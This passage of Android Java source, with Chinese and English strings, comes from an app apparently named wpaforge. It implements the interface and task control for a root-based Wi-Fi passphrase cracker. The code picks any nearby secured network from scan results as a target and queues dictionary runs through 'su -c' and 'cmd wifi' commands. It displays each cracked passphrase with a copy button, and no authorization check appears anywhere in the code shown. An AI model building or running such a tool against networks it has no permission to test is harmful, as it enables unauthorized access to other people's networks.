    /** 未命中且有未证实条目时，卡片正文里那行说明（空串＝不拼这一行）。 */
    private String missCaveat(TaskQueue.Task task) {
        if (task == null || task.state != TaskQueue.State.DONE_MISS
                || task.missInconclusive <= 0) {
            return "";
        }
        return L.f("\n未命中 · 其中 %d 条无结论（未能证实密码错；建议核对环境后重跑）",
                "\nno match · %d inconclusive (not proof of a wrong passphrase)",
                task.missInconclusive);
    }

    private String badgeText(TaskQueue.State st) {
        switch (st) {
            case RUNNING:   return L.s("进行中", "Running");
            case PAUSED:    return L.s("‖ 已暂停", "‖ Paused");
            case PENDING:   return L.s("待处理", "Pending");
            case DONE_HIT:  return L.s("✓ 已破解", "✓ Cracked");
            case DONE_MISS: return L.s("未命中", "No match");
            case STOPPED:   return L.s("已停止", "Stopped");
            default: return "?";
        }
    }

    private int badgeFg(TaskQueue.State st) {
        switch (st) {
            case RUNNING:   return AmberTheme.ON_ACCENT;
            case PAUSED:    return AmberTheme.ON_ACCENT;
            case DONE_HIT:  return AmberTheme.ON_ACCENT;
            case PENDING:   return TEXT_DIM;
            default: return TEXT_DIM;
        }
    }

    private int badgeBg(TaskQueue.State st) {
        switch (st) {
            case RUNNING:   return OK_GREEN;
            case PAUSED:    return AMBER;
            case DONE_HIT:  return OK_GREEN;
            case PENDING:   return AmberTheme.NEUTRAL_BG;
            case DONE_MISS: return AmberTheme.NEUTRAL_BG;
            case STOPPED:   return AmberTheme.DANGER_BG;
            default: return AmberTheme.NEUTRAL_BG;
        }
    }

    private Button smallChip(String label, int color, View.OnClickListener l) {
        Button b = new Button(this);
        b.setText(label);
        b.setAllCaps(false);
        b.setTextSize(11.5f);
        b.setTextColor(color);
        b.setTypeface(Typeface.create("sans-serif-medium", Typeface.NORMAL));
        b.setBackground(roundBg(AmberTheme.CARD_3, AmberTheme.RADIUS_CHIP));
        b.setMinWidth(0); b.setMinimumWidth(0);
        b.setMinHeight(0); b.setMinimumHeight(0);
        b.setStateListAnimator(null);
        b.setPadding(px(14), px(7), px(14), px(7));
        b.setOnClickListener(l);
        LinearLayout.LayoutParams lp = new LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.WRAP_CONTENT, ViewGroup.LayoutParams.WRAP_CONTENT);
        lp.rightMargin = px(7);
        b.setLayoutParams(lp);
        return b;
    }

    private void refreshQueue() {
        ui.post(() -> {
            queueCache.clear();
            queueCache.addAll(TaskQueue.load(this));
            renderQueue();
            renderProgressCardState();   // 队列是权威：一更新就重画状态行（见下方说明）
            // 队列是持久化权威：刚读到盘就顺手把「目标/字典」的显示对齐一次
            // （界面被系统重建、服务已不在时，就靠这一步把两张卡补回来）
            restoreSelectionFromAuthority();
            /* **权威一变就必须重画状态行。**
             * 踩过的坑：onTaskDone 里先 renderProgressCardState() 再 refreshQueue()
             * ——渲染那刻 queueCache 还是旧的 RUNNING，而这里更新完缓存却没重画。
             * 结果任务早已 DONE_MISS，状态行却永远停在「运行中 100%」；
             * 用户点「先算了」之后那张卡还挂着"运行中"，像程序没结束。 */
        });
    }

    /** 队列里第一个进行中/待处理的任务 */
    private TaskQueue.Task currentTaskFromQueue() {
        for (TaskQueue.Task t : queueCache) {
            if (t.state == TaskQueue.State.RUNNING) return t;
        }
        for (TaskQueue.Task t : queueCache) {
            if (t.state == TaskQueue.State.PENDING) return t;
        }
        return null;
    }

    /** 继续一个暂停的任务 */
    private void resumeTask(TaskQueue.Task task) {
        task.state = TaskQueue.State.PENDING;
        TaskQueue.update(this, task);
        CrackService.start(this);
        refreshQueue();
    }

    /**
     * 网络信息卡的两层。
     *
     * <p>第一层：网络名 + 安全类型胶囊；第二层：信号 · 信道 · 频段。
     * 改版前这两类信息拼在同一个字符串里 —— 长 SSID 会把 dBm/信道/安全类型挤掉，
     * 而且「哪个是名字、哪个是状态」要靠读才知道。
     *
     * <p>数据来源与改版前**完全相同**（{@code targetNet} 的既有字段），
     * 只是分别写进两个 View。
     */
    private void updateTargetLabel() {
        if (connectTargetView == null) return;
        if (targetNet == null) {
            connectTargetView.setText(L.s("未选择目标 —— 点这里选择",
                    "No target — tap to select"));
            connectTargetView.setTextColor(TEXT_DIM);
            if (netSecChip != null) netSecChip.setVisibility(View.GONE);
            if (netMetaView != null) {
                netMetaView.setText(L.s("信号 · 信道 · 频段", "signal · channel · band"));
            }
        } else {
            connectTargetView.setText(targetNet.displayName());
            connectTargetView.setTextColor(TEXT);
            if (netSecChip != null) {
                netSecChip.setText(securityLabel(targetNet.security));
                netSecChip.setVisibility(View.VISIBLE);
            }
            if (netMetaView != null) {
                netMetaView.setText(targetNet.rssi + " dBm"
                        + "   ·   ch" + targetNet.channel
                        + "   ·   " + (targetNet.is5Ghz ? "5 GHz" : "2.4 GHz"));
            }
        }
        updateEmptyHint();
    }

    private void showTargetPicker() {
        if (lastRecords.isEmpty()) {
            Toast.makeText(this, L.s("还没有扫描结果，请先去观测页", "No scan results yet. Go to the Observe tab first."), Toast.LENGTH_SHORT).show();
            return;
        }
        List<String> labels = new ArrayList<>();
        final List<NetRecord> selectable = new ArrayList<>();
        for (NetRecord r : lastRecords) {
            if (r.security == NetRecord.Security.OPEN) continue;
            labels.add(r.displayName() + "  (" + r.rssi + "dBm)");
            selectable.add(r);
        }
        if (selectable.isEmpty()) {
            Toast.makeText(this, L.s("扫描结果里没有加密网络", "No secured networks in the scan results"), Toast.LENGTH_SHORT).show();
            return;
        }
        // 系统 AlertDialog（层级永远正确，不出现「点了没反应」）
        final NetRecord[] arr = selectable.toArray(new NetRecord[0]);
        // 用自研 NetDialog（暗色圆角），跟 App 其它弹窗统一。
        // 这里原来是系统 AlertDialog，白底 Material 风格，很跳。
        io.github.wlmosv_png.wpaforge.ui.NetDialog td =
                new io.github.wlmosv_png.wpaforge.ui.NetDialog(this,
                        L.f("选择目标（%d 个加密网络）", "Select target (%d secured)",
                                selectable.size()), null);
        for (int i = 0; i < arr.length; i++) {
            final int idx = i;
            td.addItem(labels.get(i), dd -> {
                targetNet = arr[idx];
                Prefs.setTarget(this, targetNet.bssid, targetNet.ssid);
                updateTargetLabel();
                refreshSkippedForCurrentDict();
            });
        }
        td.setNegative(L.s("取消", "Cancel"), null);
        td.show();
    }

    /** 破解开始前记下的原网络 SSID，结束后尝试连回 */
    private String wifiBeforeRun = "";
    private long runStartAt = 0;

    private void rememberCurrentWifi() {
        try {
            android.net.wifi.WifiManager wm = (android.net.wifi.WifiManager)
                    getApplicationContext().getSystemService(android.content.Context.WIFI_SERVICE);
            android.net.wifi.WifiInfo info = wm.getConnectionInfo();
            if (info != null && info.getSSID() != null) {
                String cur = info.getSSID();
                if (cur.startsWith("\"") && cur.endsWith("\"")) {
                    cur = cur.substring(1, cur.length() - 1);
                }
                if (!cur.isEmpty() && !cur.contains("unknown")) wifiBeforeRun = cur;
            }
        } catch (Exception ignored) {}
    }

    /**
     * 破解暂停 / 中止 / 结束之后，把 WiFi 恢复到可用状态。
     *
     * <p>旧实现用 {@code cmd wifi connect-network '<ssid>' wpa2} 去重连原网络 ——
     * **那条命令根本没有密码参数**，系统不会认它。所以「恢复」从来没真正生效过，
     * 用户看到的就是「暂停了 WiFi 还断着」。
     *
     * <p>现在的做法分两步，都不需要我们知道原网络密码：
     * <ol>
     *   <li>把最后一次候选在系统里留下的目标配置删掉 —— 否则系统会拿它再试一次错误密码</li>
     *   <li>重启一次 WiFi，让系统按**已保存的凭据**自己回连</li>
     * </ol>
     */
    /**
     * （R11 起**不再动手**）这里原来是 UI 侧的“善后”：删掉目标配置 + 重启 Wi-Fi。
     *
     * <p>为什么必须停用：它会把**服务刚刚恢复好的原配置再删一次**。
     * 任务收尾的恢复已经统一搬到 {@code CrackService.restoreAfterRun()}，
     * 那是唯一有权改目标配置的地方（它还会读回验证并把结论写进日志）。
     * 两处各删一次的结果是：用户看到“已恢复 WiFi”，实际配置已经被删掉了。
     *
     * <p>保留方法只为兼容既有调用点；行为是**完全不动系统状态**。
     */
    private void restoreWifiAfterRun() {
        // 有意为空：恢复由 CrackService 负责（见其 restoreAfterRun / recoverRestore）。
    }

    private void startConnect() {
        hideResultCard();
        lastRestoreSummary = "";
        finishingNow = false;          // 防上轮异常残留，导致状态一直显示"收尾中"
        ui.removeCallbacks(finishingTick);
        if (candLabel != null) candLabel.setText(L.s("正在尝试", "TRYING"));
        // 跳过是"看不见的行为"，必须在**界面**上说出来。
        // 用户不看日志的话，3000 条的字典只跑 1200 条只会让他以为坏了。
        if (currentDictSkipped > 0) {
            String msg = L.s("这本字典有 " + currentDictSkipped + " 条你已经跑过，会自动跳过（按网络分开记）",
                    currentDictSkipped + " candidates were already tried on this network "
                            + "and will be skipped");
            Toast.makeText(this, msg, Toast.LENGTH_LONG).show();
            appendStream(msg);
        }
        if (targetNet == null) {
            Toast.makeText(this, L.s("请先选择目标网络", "Select a target network first"), Toast.LENGTH_SHORT).show();
            return;
        }
        if (currentDict == null || currentDict.isEmpty()) {
            Toast.makeText(this, L.s("字典为空，请先到审计页加载或生成", "Dictionary is empty — load or generate one in the Audit tab"), Toast.LENGTH_SHORT).show();
            return;
        }

        // 只有 Root 一条通道
        final int mode = Prefs.mode(this);
        RootProber.CheckResult chk = RootProber.check(this);
        if (!chk.ok) {
            connectStreamView.setText("");
            appendStreamColored(L.f("无法开始: %s", "Cannot start: %s", chk.title), DANGER);
            NetDialog d = new NetDialog(this, chk.title, chk.detail);
            d.setNegative(L.s("知道了", "Got it"), null);
            d.show();
            return;
        }

        // 耗时预估：按实测速度算，比固定假设准
        {
            int planned = currentDict.size();
            String est = Prefs.estimate(this, planned);
            String rate = Prefs.avgRateLabel(this);
            boolean sampled = Prefs.hasRateSample(this);
            appendStream(L.f("模式 %s · 字典 %d 条 · 预计 %s（%s %s 条/秒）",
                    "Mode %s · %d entries · est. %s (%s %s/s)",
                    Prefs.modeLabel(this), planned, est,
                    sampled ? L.s("实测", "measured") : L.s("默认", "default"), rate));
        }

        // 新的一轮：清掉上一轮的候选窗口与命中卡片，别让旧结果看着像新的
        resetCrackHud();

        // 记下原网络，跑完连回去
        rememberCurrentWifi();

        // 如果当前用的是内置生成器（没有落盘文件），**入队前先落地**。
        //
        // 为什么必须这么做：服务进程只认 dictPath。
        // path 为空时它无法重建候选，只能走「候选为空，跳过」——
        // 用户看到的「三种模式点开始都秒结束」就是这个。
        // 落盘后 path 有值，服务端行为与界面显示完全一致，不再依赖
        // 「运行时用同样参数重建」这种脆弱假设。
        if (currentDictPath == null || currentDictPath.isEmpty()) {
            try {
                currentDictPath = persistGeneratedDict();
            } catch (Throwable t) {
                appendStreamColored(L.s("内置字典落地失败: ", "Failed to save generated dictionary: ")
                        + t.getClass().getSimpleName(), DANGER);
            }
        }

        // 入队。crackService 可能还没绑定好（bindService 是异步的），
        // 所以先直接写持久化队列，不依赖服务实例 —— 避免 NPE。
        final TaskQueue.Task t = TaskQueue.enqueue(this, targetNet,
                currentDictPath, currentDictName,
                targetDictEnabled, smartSortEnabled, Prefs.mode(this),
                profileForCurrentTarget().seeds.encode());
        queueCache.clear();
        queueCache.addAll(TaskQueue.load(this));
        renderQueue();

        appendStream(L.s("已加入队列: ", "Added to queue: ") + targetNet.displayName()
                + L.s("   字典 ", "   dictionary ") + currentDictName + "（" + currentDict.size() + L.s(" 条）", " entries)"));
        if (smartSortEnabled) appendStream(L.s("智能排序: 开", "Smart ranking: on"));
        if (targetDictEnabled) appendStream(L.s("目标派生: 开", "Target derivation: on"));
        appendStream(L.s("破解在后台进行，可以切走或锁屏。通知栏能看到进度。", "Cracking runs in the background — you can switch away or lock the screen. Progress shows in the notification."));

        // 启动前台服务（服务自己会读队列并开跑）
        CrackService.start(this);

        // 绑定还没完成时，稍后再同步一次状态
        setRunning(true);
        for (long delay : new long[]{300, 900, 1800}) {
            ui.postDelayed(() -> {
                if (crackService != null) {
                    setRunning(crackService.isWorking());
                    refreshQueue();
                }
            }, delay);
        }
    }

    /** 秒数转成人话 */
    private static String humanTime(long sec) {
        if (sec < 60) return L.f("%d 秒", "%ds", sec);
        if (sec < 3600) return L.f("%d 分钟", "%d min", sec / 60);
        if (sec < 86400) return (sec / 3600) + " 小时 " + ((sec % 3600) / 60) + " 分钟";
        return (sec / 86400) + " 天 " + ((sec % 86400) / 3600) + " 小时";
    }

    private String formatDuration(long ms) {
        long s = ms / 1000;
        if (s < 60) return s + " 秒";
        long m = s / 60;
        if (m < 60) return m + L.f(" 分 %s 秒", "m %s s", (s % 60));
        return (m / 60) + " 小时 " + (m % 60) + " 分";
    }

    /** 反转候选流的折叠状态 */
    private void toggleStream() {
        streamCollapsed = !streamCollapsed;
        applyStreamHeight();
        updateFlowHeader();
    }

    /** 折叠时只留几行；展开时约 240dp。高度作用在 ScrollView 上。 */
    private void applyStreamHeight() {
        if (connectStreamView == null || streamParams == null) return;
        // 没有可见日志时整块收起 —— 空闲状态由引导文案负责，不留空白区。
        boolean empty = streamBuffer.length() == 0;
        if (empty) {
            streamParams.height = 0;
            streamParams.weight = 0f;
            connectStreamView.setMaxLines(1);
            connectStreamView.setEllipsize(TextUtils.TruncateAt.END);
        } else if (streamCollapsed) {
            streamParams.height = px(160);   // 折叠态也多给几行
            streamParams.weight = 0f;
            connectStreamView.setMaxLines(5);
            connectStreamView.setEllipsize(TextUtils.TruncateAt.END);
        } else {
            streamParams.height = px(300);   // 展开态：一屏能看到更多历史
            streamParams.weight = 0f;
            connectStreamView.setMaxLines(Integer.MAX_VALUE);
            connectStreamView.setEllipsize(null);
        }
        // 高度加在**外层 wrap** 上（它挂在 LinearLayout 里，用 LinearLayout 参数），
        // streamScroll 在 FrameLayout 里始终 MATCH_PARENT 铺满。
        //
        // 踩过的坑：直接给 streamScroll 设 LinearLayout 参数，会因为
        // 它此刻的父容器是 FrameLayout 而抛 ClassCastException（测量期崩）。
        if (streamWrapView != null) {
            streamWrapView.setLayoutParams(streamParams);
            streamWrapView.setVisibility(empty ? View.GONE : View.VISIBLE);
        }
    }

    /**
     * 刷新「回到最新」按钮的可见性。
     *
     * 只在「用户在翻历史」且「底部确实有新内容」时露出。
     * 已经在底部就不显示 —— 没用的按钮只会挡视线。
     */
    private void updateJumpLatest() {
        if (jumpLatestBtn == null || streamScroll == null) return;
        android.view.View child = streamScroll.getChildAt(0);
        if (child == null) {
            jumpLatestBtn.setVisibility(View.GONE);
            return;
        }
        int bottom = streamScroll.getScrollY() + streamScroll.getHeight();
        boolean atBottom = bottom >= child.getMeasuredHeight() - px(24);
        // 自动跟随开着的时候也不需要它
        boolean show = !atBottom && !streamAutoScroll;
        jumpLatestBtn.setVisibility(show ? View.VISIBLE : View.GONE);
    }

    /** 刷新头部箭头与行数 */
    private void updateFlowHeader() {
        if (flowChevron != null) {
            flowChevron.setText(streamCollapsed ? "▸" : "▾");
        }
        if (flowCount != null) {
            int shown = 0;
            for (int i = 0; i < streamBuffer.length(); i++) {
                if (streamBuffer.charAt(i) == '\n') shown++;
            }
            int all = streamLines.size();
            if (shown <= 0) {
                flowCount.setText("");
            } else if (streamKeyOnly && all > shown) {
                // 缩在「关键」时把总量也报出来，用户知道还有多少被折叠着
                flowCount.setText(L.f("%d / %d 行", "%d / %d", shown, all));
            } else {
                flowCount.setText(L.f("%d 行", "%d lines", shown));
            }
        }
    }

    private void appendStream(String line) {
        appendStreamColored(line, TEXT_DIM);
    }

    /**
     * 往日志区追加一行。**每行带自己的颜色**。
     *
     * 旧实现是 streamBuffer.append(line) 之后
     * connectStreamView.setTextColor(最后一行颜色) —— 而那个 TextView
     * 承载整段文本，等于每次追加都把**整个日志区**染成最后一行的颜色。
     * 用户看到的「显示不好」就是这个（历史行的颜色不停被抹掉）。
     *
     * 现在每行 append 时打上自己的 ForegroundColorSpan，互不干扰。
     *
     * @param line  行内容（null 直接忽略）
     * @param color 这一行的颜色；为 0 时用默认灰
     */
    /**
     * 日志的一行（全量留存，含被当前筛选挡住的）。
     *
     * <p>改版前只有 {@code streamBuffer} 一个 Spannable —— 行是「写进去就没法再筛」的。
     * 现在留一份结构化副本：筛「关键 / 全部」时从它重建即可，
     * 顺便把原来那段「找截断点、逐 span 删除」的脆弱代码换成列表裁剪。
     */
    private static final class LogLine {
        final CharSequence text;
        final int color;
        final io.github.wlmosv_png.wpaforge.ui.LogFilter.Kind kind;

        LogLine(CharSequence text, int color, io.github.wlmosv_png.wpaforge.ui.LogFilter.Kind kind) {
            this.text = text;
            this.color = color;
            this.kind = kind;
        }
    }

    private void appendStreamColored(String line, int color) {
        appendStreamColored(line, color, null);
    }

    /**
     * 逐条候选结果专用入口：级别**定死成「原因」**（关键视图可见）。
     *
     * <p>这条线是运行中的心跳 —— 真实的判定结论文案五花八门
     * （回连 / 超时 / 早期失败 / 握手完成…），靠关键词认不全，
     * 所以在写入时就把级别定下来，别让筛选把"它在干活"的证据一起藏了。
     */
    private void appendStreamDetail(String line, int color) {
        appendStreamColored(line, color, io.github.wlmosv_png.wpaforge.ui.LogFilter.Kind.REASON);
    }

    private void appendStreamColored(String line, int color,
                                     io.github.wlmosv_png.wpaforge.ui.LogFilter.Kind forceKind) {
        if (line == null) return;
        int c = (color == 0) ? TEXT_DIM : color;
        io.github.wlmosv_png.wpaforge.ui.LogFilter.Kind kind = forceKind != null
                ? forceKind
                : io.github.wlmosv_png.wpaforge.ui.LogFilter.classify(line.toString());

        streamLines.add(new LogLine(line, c, kind));
        while (streamLines.size() > MAX_LOG_LINES) streamLines.remove(0);

        if (!io.github.wlmosv_png.wpaforge.ui.LogFilter.visible(kind, streamKeyOnly)) {
            // 被筛掉的行照样留在全量列表里，切「全部」时能看到
            updateFlowHeader();
            updateEmptyHint();
            return;
        }
        // 日志区只在**确实有可见内容**时展开。改版前它无条件占 340dp，
        // 空闲时那一大块空白比内容还显眼。
        boolean wasEmpty = streamBuffer.length() == 0;
        appendBuffer(line, c);
        if (wasEmpty) {
            applyStreamHeight();
            updateEmptyHint();
        }

        if (connectStreamView != null) {
            // 用 Spannable 版本 setText，TextView 直接吃 span。
            connectStreamView.setText(streamBuffer, android.widget.TextView.BufferType.SPANNABLE);
            updateFlowHeader();
            updateJumpLatest();
            if (streamAutoScroll && streamScroll != null) {
                streamScroll.post(() ->
                        streamScroll.fullScroll(android.view.View.FOCUS_DOWN));
            }
        }
    }

    private void appendBuffer(CharSequence line, int color) {
        int start = streamBuffer.length();
        streamBuffer.append(line).append('\n');
        streamBuffer.setSpan(
                new android.text.style.ForegroundColorSpan(color),
                start, streamBuffer.length(),
                android.text.Spanned.SPAN_EXCLUSIVE_EXCLUSIVE);
    }

    /** 按当前筛选从全量列表重建可见日志。切筛选、清空、回到本页时调用。 */
    private void renderStream() {
        streamBuffer.clear();
        streamBuffer.clearSpans();
        for (LogLine l : streamLines) {
            if (!io.github.wlmosv_png.wpaforge.ui.LogFilter.visible(l.kind, streamKeyOnly)) continue;
            appendBuffer(l.text, l.color);
        }
        if (connectStreamView != null) {
            connectStreamView.setText(streamBuffer, android.widget.TextView.BufferType.SPANNABLE);
        }
        updateFlowHeader();
        updateJumpLatest();
        applyStreamHeight();
        updateEmptyHint();
        if (streamAutoScroll && streamScroll != null) {
            streamScroll.post(() -> streamScroll.fullScroll(android.view.View.FOCUS_DOWN));
        }
    }

    /** 日志分级 chip 的选中态 */
    private void styleFlowChips() {
        if (chipKey == null || chipAll == null) return;
        chipKey.setTextColor(streamKeyOnly ? ACCENT : TEXT_DIM);
        chipKey.setBackground(roundBg(
                streamKeyOnly ? AmberTheme.ACCENT_BG : AmberTheme.CARD_2,
                AmberTheme.RADIUS_CHIP));
        chipAll.setTextColor(streamKeyOnly ? TEXT_DIM : ACCENT);
        chipAll.setBackground(roundBg(
                streamKeyOnly ? AmberTheme.CARD_2 : AmberTheme.ACCENT_BG,
                AmberTheme.RADIUS_CHIP));
    }

    /** 刷新「正在试」区：当前候选等宽大字，上面两条淡出 */
    private void renderCandidates() {
        if (candBox == null || candRoll == null) return;
        String cur = candTicker.current();
        if (cur == null) {
            candBox.setVisibility(View.GONE);
            return;
        }
        candBox.setVisibility(View.VISIBLE);
        candRoll.setCandidate(cur);
        java.util.List<String> prev = candTicker.previous(2);
        StringBuilder sb = new StringBuilder();
        for (String p : prev) {
            if (sb.length() > 0) sb.append('\n');
            sb.append(p);
        }
        candPrev.setText(sb.toString());
        candPrev.setVisibility(sb.length() == 0 ? View.GONE : View.VISIBLE);
    }

    /**
     * 命中卡片 —— 整个产品的巅峰时刻。
     *
     * <p>改版前「命中」只是日志里的一行绿字。现在给它一块卡：
     * 口令等宽大字 + 一键复制 + 证据与位置。
     */
    private void showHitCard(String password, long ms, String detail) {
        if (hitCard == null || hitPw == null) return;
        String ssid = targetNet == null ? "" : targetNet.displayName();
        Object tag = hitCard.getTag();
        if (tag instanceof TextView) {
            ((TextView) tag).setText(L.s("⚡ 命中 · ", "★ HIT · ") + ssid);
        }
        hitPw.setText(password == null ? "" : password);
        StringBuilder meta = new StringBuilder();
        meta.append(detail == null ? "" : detail);
        if (ms > 0) {
            if (meta.length() > 0) meta.append(" · ");
            meta.append(ms).append("ms");
        }
        if (lastTotal > 0) {
            // lastTested 是「命中之前已完成的条数」，命中那条自己是第 +1 条
            // （onProgress 在命中那条上不会被调用，所以它没被计入）。
            // 2026-10-24 排查时就是这里先把我误导了一次：卡片写「第 10」，
            // 而字典里第 10 条是 trustno1、第 11 条才是命中的那条。
            meta.append(L.s(" · 第 ", " · #")).append(lastTested + 1)
                    .append(" / ").append(lastTotal).append(L.s(" 条", ""));
        }
        hitMeta.setText(meta.toString());
        hitCard.setVisibility(View.VISIBLE);
        // 命中时把日志展开到「关键」，让上下文里的任务节点一起出现
        if (streamCollapsed) toggleStream();
    }

    /** 开始一次新的破解：清掉上一轮的候选窗口与命中卡片 */
    private void resetCrackHud() {
        candTicker.clear();
        if (candBox != null) candBox.setVisibility(View.GONE);
        if (hitCard != null) hitCard.setVisibility(View.GONE);
        if (candRoll != null) candRoll.setCandidateInstant("");
        if (candPrev != null) candPrev.setText("");
        lastTested = 0;
        lastTotal = 0;
    }

    /** 最多保留的日志行数 */
    private static final int MAX_LOG_LINES = 400;

    /** 数一下当前有多少行（按 \n 计） */
    private static int countLines(CharSequence s) {
        int n = 0;
        for (int i = 0; i < s.length(); i++) {
            if (s.charAt(i) == '\n') n++;
        }
        return n;
    }

    // ---------------- 设置页 ----------------

    /**
     * 连接自测：真的发一次连接命令，把每一层判据的结果都打出来。
     *
     * 用户反馈「正确密码连不上 / 判不出」时，光看结果分不清是
     * 「命令没发出去」「连上了但没识别到」还是「根本没连上」。
     * 这里逐层报告，一次就能定位。
     */
    private void showConnTestDialog() {
        final NetDialog dlg = new NetDialog(this,
                L.s("连接自测", "Connection test"),
                L.s("输入一个你能确认密码的 WiFi，点测试。\n"
                        + "会真的发起一次连接（会短暂切换网络）。\n"
                        + "测试会临时改动目标网络的已保存配置 —— 开始前先登记原配置，"
                        + "结束（含失败/中断）后自动还原并读回验证；登记不到就拒绝执行。",
                        "Enter a Wi-Fi whose passphrase you know.\n"
                                + "It really connects once (briefly switching networks).\n"
                                + "It temporarily replaces the target's saved config: the original is "
                                + "snapshotted first and restored (with read-back) afterwards; "
                                + "if it cannot be snapshotted the test is refused."));
        final android.widget.EditText ssidIn = dlg.addField(
                L.s("SSID（网络名）", "SSID"), "");
        final android.widget.EditText pwIn = dlg.addField(
                L.s("密码", "Passphrase"), "");
        dlg.setPositive(L.s("开始测试", "Test"), (d) -> {
            String ssid = ssidIn.getText().toString().trim();
            String pw = pwIn.getText().toString();
            if (ssid.isEmpty() || pw.length() < 8) {
                android.widget.Toast.makeText(this,
                        L.s("请填写正确的 SSID 和密码（8-63 位）",
                                "Enter a valid SSID and passphrase (8-63 chars)"),
                        android.widget.Toast.LENGTH_SHORT).show();
                return;
            }
            runConnTest(ssid, pw);
        });
        dlg.setNegative(L.s("取消", "Cancel"), null);
        dlg.show();
    }

    /**
     * 分步连接自测：把整条链路拆成 6 步，每步给结论。
     *
     * 用户报障时最需要的是「卡在哪一步」，而不是一个笼统的成败。
     * 这个实现不做任何推断，只如实报告每一步命令的输出。
     */
    private void runConnTest(final String ssid, final String pass) {
        final int m = Prefs.mode(this);
        new Thread(() -> {
            final StringBuilder sb = new StringBuilder();
            sb.append("目标: ").append(ssid).append("\n");
            sb.append("模式: ").append(modeName(m)).append("\n");
            sb.append("密码长度: ").append(pass.length()).append("\n\n");

            // 构造 shell 通道（只有 Root）
            io.github.wlmosv_png.wpaforge.audit.CrackEngine.ShellChannel sh =
                    new io.github.wlmosv_png.wpaforge.audit.CrackEngine.ShellChannel() {
                        @Override public String exec(String cmd, long timeoutMs) {
                            return io.github.wlmosv_png.wpaforge.audit.RootProber
                                    .exec(null, new String[]{"su", "-c", cmd}, timeoutMs);
                        }
                        @Override public String name() { return "Root"; }
                    };

            // ── 步骤 1：权限 ──
            sb.append(L.s("【1/6】权限检查\n", "[1/6] Permissions\n"));
            boolean fl = checkSelfPermission(android.Manifest.permission.ACCESS_FINE_LOCATION)
                    == PackageManager.PERMISSION_GRANTED;
            sb.append("  定位: ").append(fl ? "✓" : "✗（会影响扫描与 SSID 读取）").append('\n');
            if (Build.VERSION.SDK_INT >= 33) {
                boolean nw = checkSelfPermission("android.permission.NEARBY_WIFI_DEVICES")
                        == PackageManager.PERMISSION_GRANTED;
                sb.append("  附近设备: ").append(nw ? "✓" : "✗（Android 13+ 扫描必需）").append('\n');
            }
            boolean locSwStep1 = scanner == null || scanner.isLocationEnabled();
            sb.append("  定位开关: ").append(locSwStep1
                    ? "✓"
                    : "✗（关着时扫描一定是空的，只给权限没用）").append('\n');

            // ── 步骤 2：通道 ──
            sb.append(L.s("\n【2/6】执行通道\n", "\n[2/6] Channel\n"));
            {
                String probe = null;
                try { probe = sh.exec("cmd wifi status", 8000); } catch (Throwable t) {
                    sb.append("  ✗ exec 异常: ").append(t.getClass().getSimpleName()).append('\n');
                }
                if (probe == null || probe.trim().isEmpty()) {
                    sb.append(L.s("  ✗ cmd wifi status 无输出 —— 通道没通，后面必然失败。\n",
                            "  x cmd wifi status returned nothing - channel is dead.\n"));
                    sb.append(L.s("     请确认设备已 root，且本应用已获得 su 授权。\n",
                            "     Make sure the device is rooted and this app has su access.\n"));
                } else {
                    sb.append("  ✓ cmd wifi status 可用\n");
                }
            }

            // ── 保护（最终审计 P0-1）：步骤 3 会**改动目标网络配置**，
            //    所以先走 R11 同一套机制：登记原配置（netId + 加密后的原口令）→ 落盘 →
            //    过 fail-closed 闸门。任何一项不成立就**禁止本次自测**并说明原因。
            final String testTaskId = "selftest-" + System.currentTimeMillis();
            io.github.wlmosv_png.wpaforge.audit.RestoreJournal.Entry guardEntry = null;
            {
                sb.append(L.s("\n【保护】登记目标原始配置（结束时会自动还原并读回验证）\n",
                        "\n[guard] snapshotting target config (auto-restored afterwards)\n"));
                try {
                    io.github.wlmosv_png.wpaforge.audit.RestoreJournal.Entry onDisk =
                            io.github.wlmosv_png.wpaforge.audit.RestoreJournal.load();
                    boolean otherPending = io.github.wlmosv_png.wpaforge.audit.RestoreRunner
                            .otherTaskPending(onDisk, testTaskId)
                            || io.github.wlmosv_png.wpaforge.audit.RestoreJournal.pendingUnknown();
                    io.github.wlmosv_png.wpaforge.audit.ConfigRestorer.Snapshot snap =
                            io.github.wlmosv_png.wpaforge.audit.ConfigRestorer.snapshot(
                                    testTaskId, ssid, null, "wpa2", testTaskId);
                    boolean saved = !otherPending
                            && io.github.wlmosv_png.wpaforge.audit.RestoreJournal.save(snap.entry);
                    sb.append("  ").append(io.github.wlmosv_png.wpaforge.audit.ConfigRestorer
                            .describe(snap.entry)).append('\n');
                    io.github.wlmosv_png.wpaforge.audit.RestoreGuard.Decision d =
                            io.github.wlmosv_png.wpaforge.audit.RestoreGuard.decide(
                                    snap.facts(otherPending, saved));
                    if (d.proceed) {
                        guardEntry = snap.entry;
                        sb.append(L.s("  ✓ 已登记，测试结束后自动还原\n",
                                "  ✓ snapshotted; will restore after the test\n"));
                    } else {
                        sb.append(L.s("  ✗ 无法保证能还原，已禁止本次自测（不执行任何写操作）: ",
                                        "  x cannot guarantee restore - self-test refused (no writes): "))
                                .append(io.github.wlmosv_png.wpaforge.audit.RestoreGuard.describe(d))
                                .append('\n');
                    }
                } catch (Throwable t) {
                    guardEntry = null;
                    sb.append(L.s("  ✗ 登记异常，已禁止本次自测: ", "  x snapshot threw - refused: "))
                            .append(t.getClass().getSimpleName()).append('\n');
                }
            }

            if (sh != null && guardEntry != null) {
                try {
                // ── 步骤 3：清配置 ──
                sb.append(L.s("\n【3/6】清除目标旧配置\n", "\n[3/6] Clear stale config\n"));
                String before = null;
                try { before = sh.exec("cmd wifi list-networks", 5000); } catch (Throwable ignored) {}
                long staleId = io.github.wlmosv_png.wpaforge.audit.ListNetworksParser
                        .findNetId(before, ssid);
                sb.append(L.s("  清除前: ", "  before: "))
                        .append(staleId >= 0 ? ("netId=" + staleId) : L.s("无旧配置", "none")).append('\n');
                if (staleId >= 0) {
                    try { sh.exec("cmd wifi forget-network " + staleId, 4000); } catch (Throwable ignored) {}
                    try { Thread.sleep(700); } catch (InterruptedException ignored) {}
                    String after = null;
                    try { after = sh.exec("cmd wifi list-networks", 5000); } catch (Throwable ignored) {}
                    long still = io.github.wlmosv_png.wpaforge.audit.ListNetworksParser
                            .findNetId(after, ssid);
                    sb.append(L.s("  清除后: ", "  after: "))
                            .append(still < 0 ? "✓ 已清干净" : ("✗ 仍然存在 netId=" + still)).append('\n');
                }

                // ── 步骤 4：断开当前 ──
                sb.append(L.s("\n【4/6】断开当前连接\n", "\n[4/6] Drop current link\n"));
                String st0 = null;
                try { st0 = sh.exec("cmd wifi status", 6000); } catch (Throwable ignored) {}
